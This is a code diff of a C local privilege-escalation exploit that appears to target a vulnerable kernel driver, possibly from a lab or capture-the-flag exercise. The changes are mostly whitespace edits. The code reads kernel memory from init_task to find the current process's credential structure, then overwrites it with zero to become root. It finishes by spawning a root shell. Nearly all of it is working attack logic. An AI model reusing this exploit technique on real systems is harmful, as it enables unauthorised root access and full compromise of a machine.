@@ -54,17 +54,17 @@ void write_kernel(void *address, const char* str_to_send, ssize_t size){
 
 int main(){
 	FD = open(DRIVER_FILE, O_RDWR);
+
 	int pid = getpid();
 	printf("[+] PID = %d\n", pid);
+
 	printf("[+] Reading head from init_tast...\n");
-
 	void *target = INIT_TASK + OFFSET_TO_HEAD;
-	char *buf, *next;
-
-	read_kernel(target, &buf, sizeof(char*));
+	char *buf;
+    read_kernel(target, &buf, sizeof(char*));
 	printf("[+] Kernel read\n");
-	printf("[+] Searching for the PID of this program...\n");
 
+	printf("[+] Searching for the PID of this program...\n");
 	int pid_of_task = 0;
 	read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
 
@@ -80,12 +80,12 @@ int main(){
 	char *addr_to_cred;
 	read_kernel(buf + HEAD_TO_CRED, &addr_to_cred, sizeof(char*));
 	printf("[+] Address to cred: %p\n", addr_to_cred);
-	printf("[+] Now setting our cred to 0...\n");
-
+	
+    printf("[+] Now setting our cred to 0...\n");
 	long long n = 0;
 	write_kernel(addr_to_cred, &n, sizeof(long long));
 	printf("[+] Root shell gained!\n");
-       	system("/bin/sh");	
+    system("/bin/sh");	
 
 	return 0;
 }
